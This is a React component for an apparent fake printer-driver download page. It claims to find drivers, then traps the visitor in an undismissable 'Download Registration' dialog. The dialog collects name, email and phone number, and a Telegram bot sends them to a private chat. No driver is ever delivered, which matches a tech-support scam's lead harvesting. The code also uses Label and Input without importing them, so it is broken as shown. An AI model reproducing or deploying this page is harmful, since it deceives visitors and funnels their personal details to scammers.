import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import DriverSearchForm from "@/components/DriverSearchForm";
import DriverDownloadCard from "@/components/DriverDownloadCard";
import DownloadProgress from "@/components/DownloadProgress";
import PrinterBrands from "@/components/PrinterBrands";
import { Printer } from "lucide-react";

interface FormData {
  name: string;
  email: string;
  phone: string;
}

const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

const PRINTER_BRANDS = {
  'HP': /^(HP|hp)-|^(deskjet|officejet|laserjet)/i,
  'Epson': /^(EPSON|epson)|^(L|WF|ET|XP)-/i,
  'Canon': /^(CANON|canon)|^(MG|MX|TR|TS|MB)/i,
  'Brother': /^(BROTHER|brother)|^(HL|MFC|DCP)-/i,
  'Lexmark': /^(LEXMARK|lexmark)|^(MS|MX|CS|CX)/i
};

const DriverDownload = () => {
  const navigate = useNavigate();
  const [modelNumber, setModelNumber] = useState("");
  const [detectedBrand, setDetectedBrand] = useState("");
  const [showDrivers, setShowDrivers] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [showBrands, setShowBrands] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
  });
  const { toast } = useToast();

  useEffect(() => {
    const detectPrinterBrand = (model: string) => {
      for (const [brand, regex] of Object.entries(PRINTER_BRANDS)) {
        if (regex.test(model)) {
          setDetectedBrand(brand);
          toast({
            title: "Brand Detected",
            description: `Detected ${brand} printer model`,
          });
          return;
        }
      }
      setDetectedBrand("");
    };

    if (modelNumber.trim()) {
      detectPrinterBrand(modelNumber);
    }
  }, [modelNumber, toast]);

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (modelNumber.trim()) {
      setShowDrivers(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
      toast({
        title: "Drivers Found",
        description: `Compatible ${detectedBrand} drivers found`,
      });
    }
  };

  const sendToTelegram = async (data: FormData) => {
    const message = `
New Driver Download Request:
Brand: ${detectedBrand}
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone}
Model: ${modelNumber}
    `;

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
          }),
        }
      );
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
    }
  };

  const handleDownload = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram(formData);
    setShowForm(false);
    setShowBrands(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
    toast({
      title: "Form Submitted",
      description: "Please select your printer brand to continue",
    });
  };

  if (showBrands) {
    return <PrinterBrands />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-white">
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <Printer className="h-20 w-20 text-primary" />
            </div>
            <h1 className="text-4xl font-bold text-gray-900 mb-4">
              {detectedBrand ? `${detectedBrand} Printer Drivers` : "Software & Driver Downloads"}
            </h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              {detectedBrand 
                ? `Download the latest ${detectedBrand} drivers, software, and firmware for your printer.`
                : "Download the latest drivers, software, and firmware for your printer."}
            </p>
          </div>

          {!showDrivers && (
            <DriverSearchForm
              modelNumber={modelNumber}
              setModelNumber={setModelNumber}
              handleSearch={handleSearch}
            />
          )}

          {showDrivers && !downloading && !showBrands && (
            <div className="space-y-6 animate-fadeIn">
              <DriverDownloadCard
                modelNumber={modelNumber}
                onDownloadClick={() => setShowForm(true)}
              />
            </div>
          )}

          <Dialog open={showForm} onOpenChange={() => {}}>
            <DialogContent
              className="sm:max-w-md"
              onPointerDownOutside={(e) => e.preventDefault()}
            >
              <DialogHeader>
                <DialogTitle>Download Registration</DialogTitle>
                <DialogDescription>
                  Please provide your information to begin the download
                </DialogDescription>
              </DialogHeader>
              <form onSubmit={handleDownload} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input
                    id="name"
                    required
                    placeholder="Enter your full name"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    required
                    placeholder="Enter your email address"
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input
                    id="phone"
                    required
                    placeholder="Enter your phone number"
                    value={formData.phone}
                    onChange={(e) =>
                      setFormData({ ...formData, phone: e.target.value })
                    }
                  />
                </div>
                <Button type="submit" className="w-full">
                  Begin Download
                </Button>
                <p className="text-sm text-gray-500 text-center">
                  By downloading, you agree to our Terms of Service and Privacy Policy
                </p>
              </form>
            </DialogContent>
          </Dialog>
        </div>
      </div>
    </div>
  );
};

export default DriverDownload;
